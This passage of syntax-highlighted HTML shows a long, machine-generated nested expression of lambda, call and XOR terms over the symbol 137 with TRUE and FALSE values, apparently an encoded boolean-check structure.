class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span 